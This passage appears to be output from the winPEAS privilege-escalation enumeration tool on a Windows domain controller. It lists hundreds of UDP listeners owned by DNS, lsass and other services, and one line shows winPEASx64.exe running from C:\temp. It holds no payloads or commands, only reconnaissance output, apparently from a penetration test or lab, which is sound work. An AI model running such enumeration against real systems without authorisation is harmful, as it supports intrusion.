  UDP        0.0.0.0               60669         *:*                            1924              dns
  UDP        0.0.0.0               60670         *:*                            1924              dns
  UDP        0.0.0.0               60671         *:*                            1924              dns
  UDP        0.0.0.0               60672         *:*                            1924              dns
  UDP        0.0.0.0               60673         *:*                            1924              dns
  UDP        0.0.0.0               60674         *:*                            1924              dns
  UDP        0.0.0.0               60675         *:*                            1924              dns
  UDP        0.0.0.0               60676         *:*                            1924              dns
  UDP        0.0.0.0               60677         *:*                            1924              dns
  UDP        0.0.0.0               60678         *:*                            1924              dns
  UDP        0.0.0.0               60679         *:*                            1924              dns
  UDP        0.0.0.0               60680         *:*                            1924              dns
  UDP        0.0.0.0               60681         *:*                            1924              dns
  UDP        0.0.0.0               60682         *:*                            1924              dns
  UDP        0.0.0.0               60683         *:*                            1924              dns
  UDP        0.0.0.0               60684         *:*                            1924              dns
  UDP        0.0.0.0               60685         *:*                            1924              dns
  UDP        0.0.0.0               60686         *:*                            1924              dns
  UDP        0.0.0.0               60687         *:*                            1924              dns
  UDP        0.0.0.0               60688         *:*                            1924              dns
  UDP        0.0.0.0               60689         *:*                            1924              dns
  UDP        0.0.0.0               60690         *:*                            1924              dns
  UDP        0.0.0.0               60691         *:*                            1924              dns
  UDP        0.0.0.0               60692         *:*                            1924              dns
  UDP        0.0.0.0               60693         *:*                            1924              dns
  UDP        0.0.0.0               60694         *:*                            1924              dns
  UDP        0.0.0.0               60695         *:*                            1924              dns
  UDP        0.0.0.0               60696         *:*                            1924              dns
  UDP        0.0.0.0               60697         *:*                            1924              dns
  UDP        0.0.0.0               60698         *:*                            1924              dns
  UDP        0.0.0.0               60699         *:*                            1924              dns
  UDP        0.0.0.0               60700         *:*                            1924              dns
  UDP        0.0.0.0               60701         *:*                            1924              dns
  UDP        0.0.0.0               60702         *:*                            1924              dns
  UDP        0.0.0.0               60703         *:*                            1924              dns
  UDP        0.0.0.0               60704         *:*                            1924              dns
  UDP        0.0.0.0               60705         *:*                            1924              dns
  UDP        0.0.0.0               60706         *:*                            1924              dns
  UDP        0.0.0.0               60707         *:*                            1924              dns
  UDP        0.0.0.0               60708         *:*                            1924              dns
  UDP        0.0.0.0               60709         *:*                            1924              dns
  UDP        0.0.0.0               60710         *:*                            1924              dns
  UDP        0.0.0.0               60711         *:*                            1924              dns
  UDP        0.0.0.0               60712         *:*                            1924              dns
  UDP        0.0.0.0               60713         *:*                            1924              dns
  UDP        0.0.0.0               60714         *:*                            1924              dns
  UDP        0.0.0.0               60715         *:*                            1924              dns
  UDP        0.0.0.0               60716         *:*                            1924              dns
  UDP        0.0.0.0               60717         *:*                            1924              dns
  UDP        0.0.0.0               60718         *:*                            1924              dns
  UDP        0.0.0.0               60719         *:*                            1924              dns
  UDP        0.0.0.0               60720         *:*                            1924              dns
  UDP        0.0.0.0               60721         *:*                            1924              dns
  UDP        0.0.0.0               60722         *:*                            1924              dns
  UDP        0.0.0.0               60723         *:*                            1924              dns
  UDP        0.0.0.0               60724         *:*                            1924              dns
  UDP        0.0.0.0               60725         *:*                            1924              dns
  UDP        0.0.0.0               60726         *:*                            1924              dns
  UDP        0.0.0.0               60727         *:*                            1924              dns
  UDP        0.0.0.0               60728         *:*                            1924              dns
  UDP        0.0.0.0               60729         *:*                            1924              dns
  UDP        0.0.0.0               60730         *:*                            1924              dns
  UDP        0.0.0.0               60731         *:*                            1924              dns
  UDP        0.0.0.0               60732         *:*                            1924              dns
  UDP        0.0.0.0               60733         *:*                            1924              dns
  UDP        0.0.0.0               60734         *:*                            1924              dns
  UDP        0.0.0.0               60735         *:*                            1924              dns
  UDP        0.0.0.0               60736         *:*                            1924              dns
  UDP        0.0.0.0               60737         *:*                            1924              dns
  UDP        0.0.0.0               60738         *:*                            1924              dns
  UDP        0.0.0.0               60739         *:*                            1924              dns
  UDP        0.0.0.0               60740         *:*                            1924              dns
  UDP        0.0.0.0               60741         *:*                            1924              dns
  UDP        0.0.0.0               60742         *:*                            1924              dns
  UDP        0.0.0.0               60743         *:*                            1924              dns
  UDP        0.0.0.0               60744         *:*                            1924              dns
  UDP        0.0.0.0               60745         *:*                            1924              dns
  UDP        0.0.0.0               60746         *:*                            1924              dns
  UDP        0.0.0.0               60747         *:*                            1924              dns
  UDP        0.0.0.0               60748         *:*                            1924              dns
  UDP        0.0.0.0               60749         *:*                            1924              dns
  UDP        0.0.0.0               60750         *:*                            1924              dns
  UDP        0.0.0.0               60751         *:*                            1924              dns
  UDP        0.0.0.0               60752         *:*                            1924              dns
  UDP        0.0.0.0               60753         *:*                            1924              dns
  UDP        0.0.0.0               60754         *:*                            1924              dns
  UDP        0.0.0.0               60755         *:*                            1924              dns
  UDP        0.0.0.0               60756         *:*                            1924              dns
  UDP        0.0.0.0               60757         *:*                            1924              dns
  UDP        0.0.0.0               60758         *:*                            1924              dns
  UDP        0.0.0.0               60759         *:*                            1924              dns
  UDP        0.0.0.0               60760         *:*                            1924              dns
  UDP        0.0.0.0               63262         *:*                            1924              dns
  UDP        10.129.215.16         53            *:*                            1924              dns
  UDP        10.129.215.16         88            *:*                            580               lsass
  UDP        10.129.215.16         137           *:*                            4                 System
  UDP        10.129.215.16         138           *:*                            4                 System
  UDP        10.129.215.16         464           *:*                            580               lsass
  UDP        127.0.0.1             53            *:*                            1924              dns
  UDP        127.0.0.1             50175         *:*                            580               lsass
  UDP        127.0.0.1             51605         *:*                            1908              dfsrs
  UDP        127.0.0.1             51869         *:*                            1892              ismserv
  UDP        127.0.0.1             52714         *:*                            1924              dns
  UDP        127.0.0.1             52715         *:*                            992               svchost
  UDP        127.0.0.1             52912         *:*                            984               svchost
  UDP        127.0.0.1             56014         *:*                            2220              C:\temp\winPEASx64.exe
  UDP        127.0.0.1             63263         *:*                            1880              Microsoft.ActiveDirectory.WebServices
  UDP        127.0.0.1             63265         *:*                            3056              powershell

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            912               svchost
  UDP        [::]                                        389           *:*                            580               lsass
  UDP        [::]                                        500           *:*                            984               svchost
  UDP        [::]                                        4500          *:*                            984               svchost
  UDP        [::]                                        5353          *:*                            992               svchost
  UDP        [::]                                        5355          *:*                            992               svchost
  UDP        [::]                                        60761         *:*                            1924              dns
  UDP        [::]                                        60762         *:*                            1924              dns
  UDP        [::]                                        60763         *:*                            1924              dns
  UDP        [::]                                        60764         *:*                            1924              dns
  UDP        [::]                                        60765         *:*                            1924              dns
  UDP        [::]                                        60766         *:*                            1924              dns
  UDP        [::]                                        60767         *:*                            1924              dns
  UDP        [::]                                        60768         *:*                            1924              dns
  UDP        [::]                                        60769         *:*                            1924              dns
  UDP        [::]                                        60770         *:*                            1924              dns
  UDP        [::]                                        60771         *:*                            1924              dns
  UDP        [::]                                        60772         *:*                            1924              dns
  UDP        [::]                                        60773         *:*                            1924              dns
  UDP        [::]                                        60774         *:*                            1924              dns
  UDP        [::]                                        60775         *:*                            1924              dns
  UDP        [::]                                        60776         *:*                            1924              dns
  UDP        [::]                                        60777         *:*                            1924              dns
  UDP        [::]                                        60778         *:*                            1924              dns
  UDP        [::]                                        60779         *:*                            1924              dns
  UDP        [::]                                        60780         *:*                            1924              dns
  UDP        [::]                                        60781         *:*                            1924              dns
  UDP        [::]                                        60782         *:*                            1924              dns
  UDP        [::]                                        60783         *:*                            1924              dns
  UDP        [::]                                        60784         *:*                            1924              dns
  UDP        [::]                                        60785         *:*                            1924              dns
  UDP        [::]                                        60786         *:*                            1924              dns
  UDP        [::]                                        60787         *:*                            1924              dns
  UDP        [::]                                        60788         *:*                            1924              dns
  UDP        [::]                                        60789         *:*                            1924              dns
  UDP        [::]                                        60790         *:*                            1924              dns
  UDP        [::]                                        60791         *:*                            1924              dns
  UDP        [::]                                        60792         *:*                            1924              dns
  UDP        [::]                                        60793         *:*                            1924              dns
  UDP        [::]                                        60794         *:*                            1924              dns
  UDP        [::]                                        60795         *:*                            1924              dns
  UDP        [::]                                        60796         *:*                            1924              dns
  UDP        [::]                                        60797         *:*                            1924              dns
  UDP        [::]                                        60798         *:*                            1924              dns
  UDP        [::]                                        60799         *:*                            1924              dns
  UDP        [::]                                        60800         *:*                            1924              dns
  UDP        [::]                                        60801         *:*                            1924              dns
  UDP        [::]                                        60802         *:*                            1924              dns
  UDP        [::]                                        60803         *:*                            1924              dns
  UDP        [::]                                        60804         *:*                            1924              dns
  UDP        [::]                                        60805         *:*                            1924              dns
  UDP        [::]                                        60806         *:*                            1924              dns
  UDP        [::]                                        60807         *:*                            1924              dns
  UDP        [::]                                        60808         *:*                            1924              dns
  UDP        [::]                                        60809         *:*                            1924              dns
  UDP        [::]                                        60810         *:*                            1924              dns
  UDP        [::]                                        60811         *:*                            1924              dns
  UDP        [::]                                        60812         *:*                            1924              dns
  UDP        [::]                                        60813         *:*                            1924              dns
  UDP        [::]                                        60814         *:*                            1924              dns
  UDP        [::]                                        60815         *:*                            1924              dns
  UDP        [::]                                        60816         *:*                            1924              dns
  UDP        [::]                                        60817         *:*                            1924              dns
  UDP        [::]                                        60818         *:*                            1924              dns
  UDP        [::]                                        60819         *:*                            1924              dns
  UDP        [::]                                        60820         *:*                            1924              dns
  UDP        [::]                                        60821         *:*                            1924              dns
  UDP        [::]                                        60822         *:*                            1924              dns
  UDP        [::]                                        60823         *:*                            1924              dns
  UDP        [::]                                        60824         *:*                            1924              dns
  UDP        [::]                                        60825         *:*                            1924              dns
  UDP        [::]                                        60826         *:*                            1924              dns
  UDP        [::]                                        60827         *:*                            1924              dns
  UDP        [::]                                        60828         *:*                            1924              dns
  UDP        [::]                                        60829         *:*                            1924              dns
  UDP        [::]                                        60830         *:*                            1924              dns
  UDP        [::]                                        60831         *:*                            1924              dns
  UDP        [::]                                        60832         *:*                            1924              dns
  UDP        [::]                                        60833         *:*                            1924              dns
  UDP        [::]                                        60834         *:*                            1924              dns
  UDP        [::]                                        60835         *:*                            1924              dns
  UDP        [::]                                        60836         *:*                            1924              dns
  UDP        [::]                                        60837         *:*                            1924              dns
  UDP        [::]                                        60838         *:*                            1924              dns
  UDP        [::]                                        60839         *:*                            1924              dns
  UDP        [::]                                        60840         *:*                            1924              dns
  UDP        [::]                                        60841         *:*                            1924              dns
  UDP        [::]                                        60842         *:*                            1924              dns
  UDP        [::]                                        60843         *:*                            1924              dns
  UDP        [::]                                        60844         *:*                            1924              dns
  UDP        [::]                                        60845         *:*                            1924              dns
  UDP        [::]                                        60846         *:*                            1924              dns
  UDP        [::]                                        60847         *:*                            1924              dns
  UDP        [::]                                        60848         *:*                            1924              dns
  UDP        [::]                                        60849         *:*                            1924              dns
  UDP        [::]                                        60850         *:*                            1924              dns
  UDP        [::]                                        60851         *:*                            1924              dns
  UDP        [::]                                        60852         *:*                            1924              dns
  UDP        [::]                                        60853         *:*                            1924              dns
  UDP        [::]                                        60854         *:*                            1924              dns
  UDP        [::]                                        60855         *:*                            1924              dns
  UDP        [::]                                        60856         *:*                            1924              dns
  UDP        [::]                                        60857         *:*                            1924              dns
  UDP        [::]                                        60858         *:*                            1924              dns
  UDP        [::]                                        60859         *:*                            1924              dns
  UDP        [::]                                        60860         *:*                            1924              dns
  UDP        [::]                                        60861         *:*                            1924              dns
  UDP        [::]                                        60862         *:*                            1924              dns
  UDP        [::]                                        60863         *:*                            1924              dns
  UDP        [::]                                        60864         *:*                            1924              dns
  UDP        [::]                                        60865         *:*                            1924              dns
  UDP        [::]                                        60866         *:*                            1924              dns
  UDP        [::]                                        60867         *:*                            1924              dns
  UDP        [::]                                        60868         *:*                            1924              dns
  UDP        [::]                                        60869         *:*                            1924              dns
  UDP        [::]                                        60870         *:*                            1924              dns
  UDP        [::]                                        60871         *:*                            1924              dns
  UDP        [::]                                        60872         *:*                            1924              dns
  UDP        [::]                                        60873         *:*                            1924              dns
  UDP        [::]                                        60874         *:*                            1924              dns
  UDP        [::]                                        60875         *:*                            1924              dns
  UDP        [::]                                        60876         *:*                            1924              dns
  UDP        [::]                                        60877         *:*                            1924              dns
  UDP        [::]                                        60878         *:*                            1924              dns
  UDP        [::]                                        60879         *:*                            1924              dns
  UDP        [::]                                        60880         *:*                            1924              dns
  UDP        [::]                                        60881         *:*                            1924              dns
  UDP        [::]                                        60882         *:*                            1924              dns
  UDP        [::]                                        60883         *:*                            1924              dns
  UDP        [::]                                        60884         *:*                            1924              dns
  UDP        [::]                                        60885         *:*                            1924              dns
  UDP        [::]                                        60886         *:*                            1924              dns
  UDP        [::]                                        60887         *:*                            1924              dns
  UDP        [::]                                        60888         *:*                            1924              dns
  UDP        [::]                                        60889         *:*                            1924              dns
  UDP        [::]                                        60890         *:*                            1924              dns
  UDP        [::]                                        60891         *:*                            1924              dns
  UDP        [::]                                        60892         *:*                            1924              dns
  UDP        [::]                                        60893         *:*                            1924              dns
  UDP        [::]                                        60894         *:*                            1924              dns
  UDP        [::]                                        60895         *:*                            1924              dns
  UDP        [::]                                        60896         *:*                            1924              dns
  UDP        [::]                                        60897         *:*                            1924              dns
  UDP        [::]                                        60898         *:*                            1924              dns
  UDP        [::]                                        60899         *:*                            1924              dns
  UDP        [::]                                        60900         *:*                            1924              dns
  UDP        [::]                                        60901         *:*                            1924              dns
  UDP        [::]                                        60902         *:*                            1924              dns
  UDP        [::]                                        60903         *:*                            1924              dns
  UDP        [::]                                        60904         *:*                            1924              dns
  UDP        [::]                                        60905         *:*                            1924              dns
  UDP        [::]                                        60906         *:*                            1924              dns
  UDP        [::]                                        60907         *:*                            1924              dns
  UDP        [::]                                        60908         *:*                            1924              dns
  UDP        [::]                                        60909         *:*                            1924              dns
  UDP        [::]                                        60910         *:*                            1924              dns
  UDP        [::]                                        60911         *:*                            1924              dns
  UDP        [::]                                        60912         *:*                            1924              dns
  UDP        [::]                                        60913         *:*                            1924              dns
  UDP        [::]                                        60914         *:*                            1924              dns
  UDP        [::]                                        60915         *:*                            1924              dns
  UDP        [::]                                        60916         *:*                            1924              dns
  UDP        [::]                                        60917         *:*                            1924              dns
  UDP        [::]                                        60918         *:*                            1924              dns
  UDP        [::]                                        60919         *:*                            1924              dns
  UDP        [::]                                        60920         *:*                            1924              dns
  UDP        [::]                                        60921         *:*                            1924              dns
  UDP        [::]                                        60922         *:*                            1924              dns
  UDP        [::]                                        60923         *:*                            1924              dns
  UDP        [::]                                        60924         *:*                            1924              dns
  UDP        [::]                                        60925         *:*                            1924              dns
  UDP        [::]                                        60926         *:*                            1924              dns
  UDP        [::]                                        60927         *:*                            1924              dns
  UDP        [::]                                        60928         *:*                            1924              dns
  UDP        [::]                                        60929         *:*                            1924              dns
  UDP        [::]                                        60930         *:*                            1924              dns
  UDP        [::]                                        60931         *:*                            1924              dns
  UDP        [::]                                        60932         *:*                            1924              dns
  UDP        [::]                                        60933         *:*                            1924              dns
  UDP        [::]                                        60934         *:*                            1924              dns
  UDP        [::]                                        60935         *:*                            1924              dns
  UDP        [::]                                        60936         *:*                            1924              dns
  UDP        [::]                                        60937         *:*                            1924              dns
  UDP        [::]                                        60938         *:*                            1924              dns
  UDP        [::]                                        60939         *:*                            1924              dns
  UDP        [::]                                        60940         *:*                            1924              dns
  UDP        [::]                                        60941         *:*                            1924              dns
  UDP        [::]                                        60942         *:*                            1924              dns
  UDP        [::]                                        60943         *:*                            1924              dns
  UDP        [::]                                        60944         *:*                            1924              dns
  UDP        [::]                                        60945         *:*                            1924              dns
  UDP        [::]                                        60946         *:*                            1924              dns
  UDP        [::]                                        60947         *:*                            1924              dns
  UDP        [::]                                        60948         *:*                            1924              dns
  UDP        [::]                                        60949         *:*                            1924              dns
  UDP        [::]                                        60950         *:*                            1924              dns
  UDP        [::]                                        60951         *:*                            1924              dns
  UDP        [::]                                        60952         *:*                            1924              dns
  UDP        [::]                                        60953         *:*                            1924              dns
  UDP        [::]                                        60954         *:*                            1924              dns
  UDP        [::]                                        60955         *:*                            1924              dns
  UDP        [::]                                        60956         *:*                            1924              dns
  UDP        [::]                                        60957         *:*                            1924              dns
  UDP        [::]                                        60958         *:*                            1924              dns
  UDP        [::]                                        60959         *:*                            1924              dns
  UDP        [::]                                        60960         *:*                            1924              dns
  UDP        [::]                                        60961         *:*                            1924              dns
  UDP        [::]                                        60962         *:*                            1924              dns
  UDP        [::]                                        60963         *:*                            1924              dns
  UDP        [::]                                        60964         *:*                            1924              dns
  UDP        [::]                                        60965         *:*                            1924              dns
  UDP        [::]                                        60966         *:*                            1924              dns
  UDP        [::]                                        60967         *:*                            1924              dns
  UDP        [::]                                        60968         *:*                            1924              dns
  UDP        [::]                                        60969         *:*                            1924              dns
  UDP        [::]                                        60970         *:*                            1924              dns
  UDP        [::]                                        60971         *:*                            1924              dns
  UDP        [::]                                        60972         *:*                            1924              dns
  UDP        [::]                                        60973         *:*                            1924              dns
  UDP        [::]                                        60974         *:*                            1924              dns
  UDP        [::]                                        60975         *:*                            1924              dns
  UDP        [::]                                        60976         *:*                            1924              dns
  UDP        [::]                                        60977         *:*                            1924              dns
  UDP        [::]                                        60978         *:*                            1924              dns
  UDP        [::]                                        60979         *:*                            1924              dns
  UDP        [::]                                        60980         *:*                            1924              dns
  UDP        [::]                                        60981         *:*                            1924              dns
  UDP        [::]                                        60982         *:*                            1924              dns
  UDP        [::]                                        60983         *:*                            1924              dns
  UDP        [::]                                        60984         *:*                            1924              dns
  UDP        [::]                                        60985         *:*                            1924              dns
  UDP        [::]                                        60986         *:*                            1924              dns
  UDP        [::]                                        60987         *:*                            1924              dns
  UDP        [::]                                        60988         *:*                            1924              dns
  UDP        [::]                                        60989         *:*                            1924              dns
  UDP        [::]                                        60990         *:*                            1924              dns
  UDP        [::]                                        60991         *:*                            1924              dns
  UDP        [::]                                        60992         *:*                            1924              dns
  UDP        [::]                                        60993         *:*                            1924              dns
  UDP        [::]                                        60994         *:*                            1924              dns
  UDP        [::]                                        60995         *:*                            1924              dns
  UDP        [::]                                        60996         *:*                            1924              dns
  UDP        [::]                                        60997         *:*                            1924              dns
  UDP        [::]                                        60998         *:*                            1924              dns
  UDP        [::]                                        60999         *:*                            1924              dns
  UDP        [::]                                        61000         *:*                            1924              dns
  UDP        [::]                                        61001         *:*                            1924              dns
  UDP        [::]                                        61002         *:*                            1924              dns
  UDP        [::]                                        61003         *:*                            1924              dns
  UDP        [::]                                        61004         *:*                            1924              dns
  UDP        [::]                                        61005         *:*                            1924              dns
  UDP        [::]                                        61006         *:*                            1924              dns
  UDP        [::]                                        61007         *:*                            1924              dns
  UDP        [::]                                        61008         *:*                            1924              dns
  UDP        [::]                                        61009         *:*                            1924              dns
  UDP        [::]                                        61010         *:*                            1924              dns
  UDP        [::]                                        61011         *:*                            1924              dns
  UDP        [::]                                        61012         *:*                            1924              dns
  UDP        [::]                                        61013         *:*                            1924              dns
  UDP        [::]                                        61014         *:*                            1924              dns
  UDP        [::]                                        61015         *:*                            1924              dns
  UDP        [::]                                        61016         *:*                            1924              dns
  UDP        [::]                                        61017         *:*                            1924              dns
  UDP        [::]                                        61018         *:*                            1924              dns
  UDP        [::]                                        61019         *:*                            1924              dns
  UDP        [::]                                        61020         *:*                            1924              dns
  UDP        [::]                                        61021         *:*                            1924              dns
  UDP        [::]                                        61022         *:*                            1924              dns
  UDP        [::]                                        61023         *:*                            1924              dns
  UDP        [::]                                        61024         *:*                            1924              dns
  UDP        [::]                                        61025         *:*                            1924              dns
  UDP        [::]                                        61026         *:*                            1924              dns
  UDP        [::]                                        61027         *:*                            1924              dns
  UDP        [::]                                        61028         *:*                            1924              dns
  UDP        [::]                                        61029         *:*                            1924              dns
  UDP        [::]                                        61030         *:*                            1924              dns
  UDP        [::]                                        61031         *:*                            1924              dns
  UDP        [::]                                        61032         *:*                            1924              dns
  UDP        [::]                                        61033         *:*                            1924              dns
  UDP        [::]                                        61034         *:*                            1924              dns
  UDP        [::]                                        61035         *:*                            1924              dns
  UDP        [::]                                        61036         *:*                            1924              dns
  UDP        [::]                                        61037         *:*                            1924              dns
  UDP        [::]                                        61038         *:*                            1924              dns
  UDP        [::]                                        61039         *:*                            1924              dns
  UDP        [::]                                        61040         *:*                            1924              dns
  UDP        [::]                                        61041         *:*                            1924              dns
  UDP        [::]                                        61042         *:*                            1924              dns
  UDP        [::]                                        61043         *:*                            1924              dns
  UDP        [::]                                        61044         *:*                            1924              dns
  UDP        [::]                                        61045         *:*                            1924              dns
  UDP        [::]                                        61046         *:*                            1924              dns
  UDP        [::]                                        61047         *:*                            1924              dns
  UDP        [::]                                        61048         *:*                            1924              dns
  UDP        [::]                                        61049         *:*                            1924              dns
  UDP        [::]                                        61050         *:*                            1924              dns
  UDP        [::]                                        61051         *:*                            1924              dns
  UDP        [::]                                        61052         *:*                            1924              dns
  UDP        [::]                                        61053         *:*                            1924              dns
  UDP        [::]                                        61054         *:*                            1924              dns
  UDP        [::]                                        61055         *:*                            1924              dns
  UDP        [::]                                        61056         *:*                            1924              dns
  UDP        [::]                                        61057         *:*                            1924              dns
  UDP        [::]                                        61058         *:*                            1924              dns
  UDP        [::]                                        61059         *:*                            1924              dns
  UDP        [::]                                        61060         *:*                            1924              dns
  UDP        [::]                                        61061         *:*                            1924              dns
  UDP        [::]                                        61062         *:*                            1924              dns
  UDP        [::]                                        61063         *:*                            1924              dns
  UDP        [::]                                        61064         *:*                            1924              dns
  UDP        [::]                                        61065         *:*                            1924              dns
  UDP        [::]                                        61066         *:*                            1924              dns
  UDP        [::]                                        61067         *:*                            1924              dns
  UDP        [::]                                        61068         *:*                            1924              dns
  UDP        [::]                                        61069         *:*                            1924              dns
  UDP        [::]                                        61070         *:*                            1924              dns
  UDP        [::]                                        61071         *:*                            1924              dns
  UDP        [::]                                        61072         *:*                            1924              dns
  UDP        [::]                                        61073         *:*                            1924              dns
  UDP        [::]                                        61074         *:*                            1924              dns
  UDP        [::]                                        61075         *:*                            1924              dns
  UDP        [::]                                        61076         *:*                            1924              dns
  UDP        [::]                                        61077         *:*                            1924              dns
  UDP        [::]                                        61078         *:*                            1924              dns
  UDP        [::]                                        61079         *:*                            1924              dns
  UDP        [::]                                        61080         *:*                            1924              dns
  UDP        [::]                                        61081         *:*                            1924              dns
  UDP        [::]                                        61082         *:*                            1924              dns
  UDP        [::]                                        61083         *:*                            1924              dns
  UDP        [::]                                        61084         *:*                            1924              dns
  UDP        [::]                                        61085         *:*                            1924              dns
  UDP        [::]                                        61086         *:*                            1924              dns
  UDP        [::]                                        61087         *:*                            1924              dns
  UDP        [::]                                        61088         *:*                            1924              dns
  UDP        [::]                                        61089         *:*                            1924              dns
  UDP        [::]                                        61090         *:*                            1924              dns
  UDP        [::]                                        61091         *:*                            1924              dns
  UDP        [::]                                        61092         *:*                            1924              dns
  UDP        [::]                                        61093         *:*                            1924              dns
  UDP        [::]                                        61094         *:*                            1924              dns
  UDP        [::]                                        61095         *:*                            1924              dns
  UDP        [::]                                        61096         *:*                            1924              dns
  UDP        [::]                                        61097         *:*                            1924              dns
  UDP        [::]                                        61098         *:*                            1924              dns
  UDP        [::]                                        61099         *:*                            1924              dns
  UDP        [::]                                        61100         *:*                            1924              dns
  UDP        [::]                                        61101         *:*                            1924              dns
  UDP        [::]                                        61102         *:*                            1924              dns
  UDP        [::]                                        61103         *:*                            1924              dns
  UDP        [::]                                        61104         *:*                            1924              dns
  UDP        [::]                                        61105         *:*                            1924              dns
  UDP        [::]                                        61106         *:*                            1924              dns
  UDP        [::]                                        61107         *:*                            1924              dns
  UDP        [::]                                        61108         *:*                            1924              dns
  UDP        [::]                                        61109         *:*                            1924              dns
  UDP        [::]                                        61110         *:*                            1924              dns
  UDP        [::]                                        61111         *:*                            1924              dns
  UDP        [::]                                        61112         *:*                            1924              dns
  UDP        [::]                                        61113         *:*                            1924              dns
  UDP        [::]                                        61114         *:*                            1924              dns
  UDP        [::]                                        61115         *:*                            1924              dns
  UDP        [::]                                        61116         *:*                            1924              dns
  UDP        [::]                                        61117         *:*                            1924              dns
  UDP        [::]                                        61118         *:*                            1924              dns
  UDP        [::]                                        61119         *:*                            1924              dns
  UDP        [::]                                        61120         *:*                            1924              dns
  UDP        [::]                                        61121         *:*                            1924              dns
  UDP        [::]                                        61122         *:*                            1924              dns
  UDP        [::]                                        61123         *:*                            1924              dns
  UDP        [::]                                        61124         *:*                            1924              dns
  UDP        [::]                                        61125         *:*                            1924              dns
  UDP        [::]                                        61126         *:*                            1924              dns
  UDP        [::]                                        61127         *:*                            1924              dns
  UDP        [::]                                        61128         *:*                            1924              dns
  UDP        [::]                                        61129         *:*                            1924              dns
  UDP        [::]                                        61130         *:*                            1924              dns
  UDP        [::]                                        61131         *:*                            1924              dns
  UDP        [::]                                        61132         *:*                            1924              dns
  UDP        [::]                                        61133         *:*                            1924              dns
  UDP        [::]                                        61134         *:*                            1924              dns
  UDP        [::]                                        61135         *:*                            1924              dns
  UDP        [::]                                        61136         *:*                            1924              dns
  UDP        [::]                                        61137         *:*                            1924              dns
  UDP        [::]                                        61138         *:*                            1924              dns
  UDP        [::]                                        61139         *:*                            1924              dns
  UDP        [::]                                        61140         *:*                            1924              dns
  UDP        [::]                                        61141         *:*                            1924              dns
  UDP        [::]                                        61142         *:*                            1924              dns
  UDP        [::]                                        61143         *:*                            1924              dns
  UDP        [::]                                        61144         *:*                            1924              dns
  UDP        [::]                                        61145         *:*                            1924              dns
  UDP        [::]                                        61146         *:*                            1924              dns
  UDP        [::]                                        61147         *:*                            1924              dns
  UDP        [::]                                        61148         *:*                            1924              dns
  UDP        [::]                                        61149         *:*                            1924              dns
  UDP        [::]                                        61150         *:*                            1924              dns
  UDP        [::]                                        61151         *:*                            1924              dns
  UDP        [::]                                        61152         *:*                            1924              dns
  UDP        [::]                                        61153         *:*                            1924              dns
  UDP        [::]                                        61154         *:*                            1924              dns
  UDP        [::]                                        61155         *:*                            1924              dns
  UDP        [::]                                        61156         *:*                            1924              dns
  UDP        [::]                                        61157         *:*                            1924              dns
  UDP        [::]                                        61158         *:*                            1924              dns
  UDP        [::]                                        61159         *:*                            1924              dns
  UDP        [::]                                        61160         *:*                            1924              dns
  UDP        [::]                                        61161         *:*                            1924              dns
  UDP        [::]                                        61162         *:*                            1924              dns
  UDP        [::]                                        61163         *:*                            1924              dns
  UDP        [::]                                        61164         *:*                            1924              dns
  UDP        [::]                                        61165         *:*                            1924              dns
  UDP        [::]                                        61166         *:*                            1924              dns
  UDP        [::]                                        61167         *:*                            1924              dns
  UDP        [::]                                        61168         *:*                            1924              dns
  UDP        [::]                                        61169         *:*                            1924              dns
  UDP        [::]                                        61170         *:*                            1924              dns
  UDP        [::]                                        61171         *:*                            1924              dns
  UDP        [::]                                        61172         *:*                            1924              dns
  UDP        [::]                                        61173         *:*                            1924              dns
  UDP        [::]                                        61174         *:*                            1924              dns
  UDP        [::]                                        61175         *:*                            1924              dns
  UDP        [::]                                        61176         *:*                            1924              dns
  UDP        [::]                                        61177         *:*                            1924              dns
  UDP        [::]                                        61178         *:*                            1924              dns
  UDP        [::]                                        61179         *:*                            1924              dns
  UDP        [::]                                        61180         *:*                            1924              dns
  UDP        [::]                                        61181         *:*                            1924              dns
  UDP        [::]                                        61182         *:*                            1924              dns
  UDP        [::]                                        61183         *:*                            1924              dns
  UDP        [::]                                        61184         *:*                            1924              dns
  UDP        [::]                                        61185         *:*                            1924              dns
  UDP        [::]                                        61186         *:*                            1924              dns
  UDP        [::]                                        61187         *:*                            1924              dns
  UDP        [::]                                        61188         *:*                            1924              dns
  UDP        [::]                                        61189         *:*                            1924              dns
  UDP        [::]                                        61190         *:*                            1924              dns
  UDP        [::]                                        61191         *:*                            1924              dns
  UDP        [::]                                        61192         *:*                            1924              dns
  UDP        [::]                                        61193         *:*                            1924              dns
  UDP        [::]                                        61194         *:*                            1924              dns
  UDP        [::]                                        61195         *:*                            1924              dns
  UDP        [::]                                        61196         *:*                            1924              dns
  UDP        [::]                                        61197         *:*                            1924              dns
  UDP        [::]                                        61198         *:*                            1924              dns
  UDP        [::]                                        61199         *:*                            1924              dns
  UDP        [::]                                        61200         *:*                            1924              dns
  UDP        [::]                                        61201         *:*                            1924              dns
  UDP        [::]                                        61202         *:*                            1924              dns
  UDP        [::]                                        61203         *:*                            1924              dns
  UDP        [::]                                        61204         *:*                            1924              dns
  UDP        [::]                                        61205         *:*                            1924              dns
  UDP        [::]                                        61206         *:*                            1924              dns
  UDP        [::]                                        61207         *:*                            1924              dns
  UDP        [::]                                        61208         *:*                            1924              dns
  UDP        [::]                                        61209         *:*                            1924              dns
  UDP        [::]                                        61210         *:*                            1924              dns
  UDP        [::]                                        61211         *:*                            1924              dns
  UDP        [::]                                        61212         *:*                            1924              dns
  UDP        [::]                                        61213         *:*                            1924              dns
  UDP        [::]                                        61214         *:*                            1924              dns
  UDP        [::]                                        61215         *:*                            1924              dns
  UDP        [::]                                        61216         *:*                            1924              dns
  UDP        [::]                                        61217         *:*                            1924              dns
  UDP        [::]                                        61218         *:*                            1924              dns
  UDP        [::]                                        61219         *:*                            1924              dns
  UDP        [::]                                        61220         *:*                            1924              dns
  UDP        [::]                                        61221         *:*                            1924              dns
  UDP        [::]                                        61222         *:*                            1924              dns
  UDP        [::]                                        61223         *:*                            1924              dns
  UDP        [::]                                        61224         *:*                            1924              dns
  UDP        [::]                                        61225         *:*                            1924              dns
  UDP        [::]                                        61226         *:*                            1924              dns
  UDP        [::]                                        61227         *:*                            1924              dns
  UDP        [::]                                        61228         *:*                            1924              dns
  UDP        [::]                                        61229         *:*                            1924              dns
  UDP        [::]                                        61230         *:*                            1924              dns
  UDP        [::]                                        61231         *:*                            1924              dns
  UDP        [::]                                        61232         *:*                            1924              dns
  UDP        [::]                                        61233         *:*                            1924              dns
  UDP        [::]                                        61234         *:*                            1924              dns
